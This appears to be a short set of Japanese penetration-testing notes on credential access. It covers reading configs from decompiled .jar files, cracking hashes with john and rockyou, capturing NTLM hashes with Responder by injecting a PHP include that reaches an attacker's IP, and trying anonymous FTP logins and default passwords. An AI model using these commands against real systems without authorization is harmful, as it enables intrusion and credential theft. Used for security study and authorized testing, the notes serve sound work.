# 資格情報アクセス

## アプリケーションに含まれる情報
・.jarの情報はJD-GUIで見れる
    ・Spring Bootを使用していればapplication.propertiesで見れる


## パスワードハッシュ解析
DB等から取得したパスワードハッシュを復元することで、パスワードを使いまわしている場合に別システムに侵入できる
johnでパスワード解析できる
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
```
Kali Linuxであれば/user/share/wordlistsにrockyouの圧縮されたファイルがある。

## NTLMハッシュの取得

### Responder
```
responder -I tun0
```
Responderを使用することで様々な通信を受けることができる

### 攻撃対象からResponderへの通信を発生させる
responderを起動した後、攻撃対象のWebアプリケーション等に対して外部のファイルを取得するように動かす
```
例：PHPでinclude(//<受けのIPアドレス>/somefile)を実行されるようCodeInjectionを行うなど
```
取得できたハッシュをjohnなどで解析する

## 匿名ユーザでのアクセス
### FTP
匿名ユーザ「anonymous」、パスワード空欄でログインできる場合がある
```
ftp anonymous@10.111.111.111
```

## デフォルトパスワードの使用
サービスごとのデフォルトパスワードでログインできないか試行する。
https://cirt.net/passwords